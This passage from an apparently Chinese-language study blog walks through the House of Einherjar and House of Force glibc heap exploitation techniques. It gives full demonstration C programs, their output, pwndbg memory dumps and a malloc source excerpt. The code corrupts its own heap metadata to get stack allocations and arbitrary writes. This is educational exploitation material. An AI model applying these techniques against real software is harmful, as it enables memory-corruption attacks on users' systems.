fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk at %p looks like:\n"</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"fwd: %#lx\n"</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bck: %#lx\n"</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"fwd_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bck_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x4f8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x4f8 bytes for 'b'.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nb.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size is: (0x500) | prev_inuse = 0x501\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This is easiest if b.size is a multiple of 0x100 so you "</span></span><br><span class="line">		   <span class="string">"don't change the size of b, only its prev_inuse bit\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If it had been modified, we would need a fake chunk inside "</span></span><br><span class="line">		   <span class="string">"b where it will try to consolidate the next chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span></span><br><span class="line">		   <span class="string">"it will consolidate with our fake chunk\n"</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake prev_size will be %p - %p = %#lx\n"</span>, b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk's size to reflect b's new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk's size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next malloc(0x200) is at %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)d == (<span class="type">long</span>)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>利用方式和2.23下差不多，首先创建了一个0x38大小的堆块，接着在栈上伪造prev_size, size, fd, bk, fd_nextsize, bk_nextsize。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x7fffffffdc20</span></span><br><span class="line"><span class="number">0x7fffffffdc20</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffffffdc30</span>:	<span class="number">0x00007fffffffdc20</span>	<span class="number">0x00007fffffffdc20</span></span><br><span class="line"><span class="number">0x7fffffffdc40</span>:	<span class="number">0x00007fffffffdc20</span>	<span class="number">0x00007fffffffdc20</span></span><br></pre></td></tr></tbody></table></figure>

<p>接下来mallc了0x4f8大小的chunk b。现在假设有一个off-by-null漏洞通过a溢出了，改了b的size为0x500（将inuse位改成了0)，现在ptmalloc认定b为释放掉的chunk。想要与fake_chunk合并，我们还需要伪造一下prev_size。<code>fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);</code>，同时还需要将fake的size给改掉</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x55555555b250</span></span><br><span class="line"><span class="number">0x55555555b250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x55555555b260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55555555b270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55555555b280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55555555b290</span>:	<span class="number">0xffffd5555555d670</span>	<span class="number">0x0000000000000500</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x7fffffffdc20</span></span><br><span class="line"><span class="number">0x7fffffffdc20</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0xffffd5555555d670</span></span><br><span class="line"><span class="number">0x7fffffffdc30</span>:	<span class="number">0x00007fffffffdc20</span>	<span class="number">0x00007fffffffdc20</span></span><br><span class="line"><span class="number">0x7fffffffdc40</span>:	<span class="number">0x00007fffffffdc20</span>	<span class="number">0x00007fffffffdc20</span></span><br></pre></td></tr></tbody></table></figure>

<p>现在释放就可以合并了。现在mallc的时候就会分配到伪造的栈上那里。运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Welcome to House of Einherjar!</span><br><span class="line">Tested in Ubuntu <span class="number">18.04</span><span class="number">.4</span> <span class="number">64b</span>it.</span><br><span class="line">This technique only works with disabled tcache-option <span class="keyword">for</span> glibc or with size of b larger than <span class="number">0x408</span>, see build_glibc.sh <span class="keyword">for</span> build instructions.</span><br><span class="line">This technique can be used when you have an off-by-one into a <span class="built_in">malloc</span><span class="number">'</span>ed region with a null byte.</span><br><span class="line"></span><br><span class="line">We allocate <span class="number">0x38</span> bytes <span class="keyword">for</span> <span class="string">'a'</span></span><br><span class="line">a: <span class="number">0x55555555b260</span></span><br><span class="line">Since we want to overflow <span class="string">'a'</span>, we need the <span class="string">'real'</span> size of <span class="string">'a'</span> after rounding: <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">We create a fake chunk wherever we want, in this <span class="keyword">case</span> we<span class="number">'ll</span> create the chunk on the <span class="built_in">stack</span></span><br><span class="line">However, you can also create the chunk in the heap or the bss, as <span class="type">long</span> as you know its address</span><br><span class="line">We <span class="built_in">set</span> our fwd and bck pointers to point at the fake_chunk in order to pass the unlink <span class="title function_">checks</span></span><br><span class="line"><span class="params">(although we could <span class="keyword">do</span> the unsafe unlink technique here in some scenarios)</span></span><br><span class="line">Our fake chunk at 0x7fffffffdcc0 looks like:</span><br><span class="line"><span class="title function_">prev_size</span> <span class="params">(not used)</span>: 0x100</span><br><span class="line">size: 0x100</span><br><span class="line">fwd: 0x7fffffffdcc0</span><br><span class="line">bck: 0x7fffffffdcc0</span><br><span class="line">fwd_nextsize: 0x7fffffffdcc0</span><br><span class="line">bck_nextsize: 0x7fffffffdcc0</span><br><span class="line"></span><br><span class="line">We allocate 0x4f8 bytes <span class="keyword">for</span> 'b'.</span><br><span class="line">b: 0x55555555b2a0</span><br><span class="line"></span><br><span class="line">b.size: 0x501</span><br><span class="line">b.size is: <span class="params">(<span class="number">0x500</span>)</span> | prev_inuse = <span class="number">0x501</span></span><br><span class="line">We overflow <span class="string">'a'</span> with a single null byte into the metadata of <span class="string">'b'</span></span><br><span class="line">b.size: <span class="number">0x500</span></span><br><span class="line">This is easiest <span class="keyword">if</span> b.size is a multiple of <span class="number">0x100</span> so you don<span class="number">'</span>t change the size of b, only its prev_inuse bit</span><br><span class="line">If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk</span><br><span class="line"></span><br><span class="line">We write a fake prev_size to the last <span class="number">8</span> bytes of a so that it will consolidate with our fake chunk</span><br><span class="line">Our fake prev_size will be <span class="number">0x55555555b290</span> - <span class="number">0x7fffffffdcc0</span> = <span class="number">0xffffd5555555d5d0</span></span><br><span class="line"></span><br><span class="line">Modify fake chunk<span class="number">'</span>s size to reflect b<span class="number">'</span>s new prev_size</span><br><span class="line">Now we <span class="built_in">free</span> b and this will consolidate with our fake chunk since b prev_inuse is not <span class="built_in">set</span></span><br><span class="line">Our fake chunk size is now <span class="number">0xffffd5555557e341</span> (b.size + fake_prev_size)</span><br><span class="line"></span><br><span class="line">Now we can call <span class="built_in">malloc</span>() and it will begin in our fake chunk</span><br><span class="line">Next <span class="built_in">malloc</span>(<span class="number">0x200</span>) is at <span class="number">0x7fffffffdcd0</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-force-top-chunk-1"><a href="#house-of-force-top-chunk-1" class="headerlink" title="house_of_force(top chunk)"></a>house_of_force(top chunk)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Force\n\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The top chunk is a special chunk. Is the last in memory "</span></span><br><span class="line">		<span class="string">"and is the chunk that will be resized when malloc asks for more space from the os.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the end, we will use this to overwrite a variable at %p.\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's allocate the first chunk, taking space from the wilderness.\n"</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk of 256 bytes has been allocated at %p.\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n"</span>);</span><br><span class="line">	<span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe top chunk starts at %p\n"</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Old size of top chunk %#llx\n"</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New size of top chunk %#llx\n"</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"</span></span><br><span class="line">	   <span class="string">"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"</span></span><br><span class="line">	   <span class="string">"overflow) and will then be able to allocate a chunk right over the desired region.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"</span></span><br><span class="line">	   <span class="string">"we will malloc %#lx bytes.\n"</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As expected, the new pointer is at the same place as the old top chunk: %p\n"</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow, the next chunk we overwrite will point at our target buffer.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(100) =&gt; %p!\n"</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can finally overwrite that value:\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>此攻击手法和2.23下的差不多，核心就是控制top chunk的size然后实现任意地址写。现在malloc一个0x100大小的堆块p1，假设可以通过p1溢出到top chunk，并将topchunk size改为-1。看如下的源码。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  {</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>

<p>size为-1的时候会变得无限大，会满足利用top chunk分配条件，这个时候我们可以控制分配的指针达到任意地址写。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0x111</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0x55555555b360</span></span><br><span class="line">Size: <span class="number">0xffffffffffffffff</span></span><br></pre></td></tr></tbody></table></figure>

<p>从top_chunk分配的话只要向前推到bss_var - 0x10就行了。然后malloc(100)就可以控制bss_var了，改bss_var为YEAH!!!。</p>
<blockquote>
<p>In [1]: hex(0x55555555b360 + 0xffffffffffffcce0 + 0x10)<br>Out[1]: ‘0x10000555555558050’</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x555555558060</span> - <span class="number">0x10</span></span><br><span class="line"><span class="number">0x555555558050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span></span><br><span class="line"><span class="number">0x555555558060</span> &lt;bss_var&gt;:	<span class="number">0x0021212148414559</span>	<span class="number">0x676e697274732061</span></span><br><span class="line"><span class="number">0x555555558070</span> &lt;bss_var+<span class="number">16</span>&gt;:	<span class="number">0x6577207461687420</span>	<span class="number">0x6f7420746e617720</span></span><br><span class="line"><span class="number">0x555555558080</span> &lt;bss_var+<span class="number">32</span>&gt;:	<span class="number">0x6972777265766f20</span>	<span class="number">0x00000000002e6574</span></span><br><span class="line"><span class="number">0x555555558090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x555555558060</span> </span><br><span class="line"><span class="number">0x555555558060</span> &lt;bss_var&gt;:	<span class="string">"YEAH!!!"</span></span><br></pre></td></tr></tbody></table></figure>

<p>运行结果</p>
